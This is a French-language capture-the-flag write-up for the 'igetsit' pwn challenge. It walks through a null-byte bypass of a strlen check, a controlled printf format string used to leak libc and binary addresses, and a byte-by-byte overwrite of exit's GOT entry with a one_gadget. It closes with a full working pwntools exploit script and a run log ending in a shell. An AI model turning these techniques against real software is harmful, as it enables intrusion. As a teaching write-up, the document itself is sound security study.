---
layout: post
title: "Challenge igetsit, batmans.kitchen"
date: 2026-02-23 12:00:00 +0100
categories: CTF
---

[https://ctf.batmans.kitchen/challs](https://ctf.batmans.kitchen/challs)

Un petit executable qui permet de lire et d'écrire dans des allocations de tailles différentes (dans .data).
Le binaire a toutes les protections sauf full RELRO, et la libc est un peu ancienne (2.31).
Comme d'habitude j'utilise pwninit/patchelf pour reproduire l'environnement avec sa libc.

La fonction `writeBin()` controle mal l'entrée de l'utilisateur ; la saisie se fait avec `gets()` qui autorise les nuls.
La validation se fait avec `strlen()` qui s'arrete à 0x00, il suffit donc d'envoyer un `\x00` au début de la chaine pour contourner.
```c
+0x0fd        gets(buf: (&var_58)[sx.q(rax_3)])
+0x11d        if (strlen((&var_58)[sx.q(rax_3)]) > sx.q(var_64))
```

Après le bin7 il y a readFormat, skillIssue, stdout et stdin.
```text
0x5672b6eb7890 <bin7+1008>:     0x6b6161636b616162      0x6b6161656b616164
0x5672b6eb78a0 <readFormat>:    0x6161617024343125      0x6161616461616163
0x5672b6eb78b0 <skillIssue>:    0x7373496c6c696b73      0x726f662073006575
0x5672b6eb78c0 <skillIssue+16>: 0x0000002e756f7920      0x0000000000000000
0x5672b6eb78d0 <stdout@@GLIBC_2.2.5>:   0x00007983e1dcd6a0      0x0000000000000000
0x5672b6eb78e0 <stdin@@GLIBC_2.2.5>:    0x00007983e1dcc980      0x0000000000000000
```
On peut écraser `readFormat`, qui sera utilisé par un `printf` dans `getBin()`.
Dans `getBin` l'utilisateur précise le format (1-4), mais si on choisit 5 le `readFormat` n'est pas réécrit.

On controle donc ce qui est envoyé à `printf`, dans un buffer assez grand.
Si on déborde trop loin on écrase `stdout` et `stdin`, le programme plante.
On pourrait faire un FSOP je pense, mais je choisis de rester sur la format string.

Rappel pour la format string, en amd64 les arguments sont passés par les registres avant la pile.
En bonus un mnémonique pour se souvenir de la convention d'appel : 
```text
Diane's silk dress costs $89
DI      SI   DX    CX    R8    R9
```
`DI` est l'argument 0, `SI` l'argument 1, etc. et après le 5eme la stack est utilisée.
Notre buffer n'est pas sur la pile, on ne peut pas utiliser `frmt_payload` de pwntools pour aller plus vite.

Les relocations (`.got`) du binaire sont r/w. Je pars donc sur l'écrasement du pointeur d'une
fonction par une adresse qui donne un shell (one_gadget). Pas de ROP compliqué.
Pour ca il faut leaker l'adresse de la libc et celle du binaire. Ce que la format string nous permet de faire.

Comme je ne peux faire qu'une écriture par passage (le buffer n'est pas sur la pile), je découpe l'écriture en 6 octets.
Je ne dois pas écraser une fonction qui est utilisée entre temps,
`exit()` est appelée à la fin du programme, c'est une bonne cible.

Je récapitule :
1. Je crée un buffer avec un `\x00` au début pour contourner le check `strlen`.
2. Je modifie la format string pour qu'elle affiche l'adresse de la libc et celle du binaire.
3. Je modifie l'adresse de `exit` par une adresse qui donne un shell (one_gadget).

```bash
➜  igetsit ./exploit.py.ok-formatstring 
[+] Starting local process '/opt/ctf/batmans/igetsit/igetsit_patched': pid 20935
[+] libc.address: 0x755c2f390000
[+] elf.address: 0x5fd85036e000
[*] will write 0x755c2f473b01 to 0x5fd850372060
[*] Switching to interactive mode
Linux axismundi 6.8.0-100-generic #100-Ubuntu SMP PREEMPT_DYNAMIC Tue Jan 13 16:40:06 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
cat: flag.txt: No such file or directory
$  
```

 \- mandragore, 2026/02/23

```python
#!/usr/bin/env python3

from sys import stdin
from pwn import *
import re
import sys
import os
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./igetsit_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

if args.REMOTE:
    p = remote('yapster-8437454c103936da.instancer.batmans.kitchen', 1337, ssl=True)
else:
    if args.GDB:
        p = gdb.debug(elf.path, gdbscript='''
            break *readBin+0x19d
            continue
        ''')
    else:
        p = process(elf.path)

def get(idx,type=3):
    p.sendline(b'1')
    p.sendlineafter(b'> ',str(idx).encode())
    p.sendlineafter(b'> ',str(type).encode())
    return p.recvuntil(b'> ')

def write(idx, data=False):
    p.sendline(b'2')
    p.sendlineafter(b'> ',str(idx).encode())
    size=p.recvregex(b'([0-9]+)',capture=True).group(1)
    if data:
        p.sendlineafter(b'> ',data)
    else:
        p.sendlineafter(b'> ',cyclic(2**(idx+3)))
    p.recvuntil(b'> ')

p.recvuntil(b'> ')

write(7,b'123\0'+cyclic(cyclic_find(b'faak'))+b'%3$pX')
leak=get(7,5)
leak=re.search(b'(0x.+)X',leak).group(1)
libc.address=int(leak,16)-libc.sym.write-23
log.success(f"libc.address: {libc.address:#x}")

write(7,b'123\0'+cyclic(cyclic_find(b'faak'))+b'%10$pX')
leak=get(7,5)
leak=re.search(b'(0x.+)X',leak).group(1)
elf.address=int(leak,16)-elf.sym.bin0
log.success(f"elf.address: {elf.address:#x}")

where=elf.got.exit
what=libc.address+0xe3b01 # one_gadget
log.info(f'will write {what:#x} to {where:#x}')

# rep movsb
for i in range(0,6):
    payload={
        0: p64(where+i)+b'\0',
        0x400: b'%'+str(p64(what)[i]).encode()+b'c%1$hhn'
    }
    write(7,fit(payload))
    get(7,5)

p.sendline(b'3') # the end is a new start

p.sendline(b'uname -a; cat flag.txt')
p.interactive()
```
